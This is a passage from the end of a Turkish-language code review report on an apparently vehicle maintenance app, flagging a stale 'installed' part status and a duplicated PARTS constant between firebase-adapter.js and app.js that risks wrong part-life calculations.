  parçayı "takılı" göstermeye devam eder. Bu, uygulamanın **asıl işlevini** (doğru bakım
  uyarısı) bozar; O-4 ile birlikte ele alınmalı.
- `firebase-adapter.js:35`'teki `PARTS` sabiti `app.js:1`'in birebir kopyası ve yorumda
  "elle senkron tutulmalı" deniyor. İki liste ayrışırsa `expectedLifeKm` yanlış hesaplanır
  ve uyarı eşikleri kayar. Ortak bir modüle taşınmalı.

---

*Rapor sonu. Tüm bulgular kaynak dosyalar okunarak doğrulanmıştır; doğrulanamayan
maddeler B-1/B-2/B-3 ve O-6(a) altında açıkça işaretlenmiştir.*
